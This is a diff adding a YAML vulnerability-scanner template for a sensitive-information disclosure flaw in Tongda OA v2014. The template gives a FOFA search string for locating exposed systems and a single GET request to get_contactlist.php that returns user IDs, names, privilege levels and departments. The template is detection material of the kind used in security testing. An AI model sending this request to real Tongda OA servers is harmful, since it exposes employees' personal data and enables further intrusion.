@@ -1,0 +1,20 @@
+id: tongda-contact-list-disclosure
+
+info:
+  name: 通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |
+    通达OA v2014 get_contactlist.php文件存在信息泄漏漏洞，攻击者通过漏洞可以获取敏感信息，进一步攻击
+    fofa: app="TDXK-通达OA"
+  tags: tongda,oa,contact,list,disclosure
+  created: 2025/03/13
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
+    expression: response.status == 200 && response.body.bcontains(b'"user_uid":') && response.body.bcontains(b'"user_name":') && response.body.bcontains(b'"priv_name":') && response.body.bcontains(b'"dept_name":')
+expression: r0()
